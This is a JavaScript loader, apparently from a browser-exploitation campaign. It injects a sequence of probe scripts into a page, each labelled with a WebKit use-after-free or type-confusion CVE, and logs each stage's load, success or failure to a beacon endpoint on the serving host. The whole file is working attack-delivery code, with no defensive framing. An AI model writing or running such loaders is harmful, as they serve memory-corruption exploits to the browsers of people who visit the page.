// p190 — Multi-probe loader
// Loads strongest CVE probes sequentially via script injection.
// Each probe runs its own beacon prefix, so results don't collide.
// Beacon prefix: V190-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V190-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Probes in priority order — strongest CVE candidates first
  var PROBES = [
    'p189-ruby-uaf.js',          // CVE-2024-40782 — ruby type confusion
    'p184-fontload-uaf.js',      // CVE-2024-54502 — fontLoadingTimerFired UAF
    'p188-urlparser-uaf.js',     // CVE-2023-42950 — URLParser stale StringView
    'p184-eventtarget-uaf.js',   // Bug 263029 — EventTarget UAF
    'p185-font-uaf.js'           // Bug 263400 — CachedFontLoadRequest UAF
  ];

  var probeIndex = 0;

  function loadNext() {
    if (probeIndex >= PROBES.length) {
      syncB('ALL-DONE-' + PROBES.length);
      return;
    }

    var name = PROBES[probeIndex];
    syncB('LOAD-' + name.replace('.js', '').substring(0, 20));

    var script = document.createElement('script');
    script.src = name + '?v=190&t=' + Date.now();

    script.onload = function() {
      syncB('OK-' + name.replace('.js', '').substring(0, 20));
      probeIndex++;
      // Wait for probe to finish before loading next
      setTimeout(loadNext, 3000);
    };

    script.onerror = function() {
      syncB('FAIL-' + name.replace('.js', '').substring(0, 20));
      probeIndex++;
      setTimeout(loadNext, 100);
    };

    document.body.appendChild(script);
  }

  // Start loading probes
  loadNext();

})();
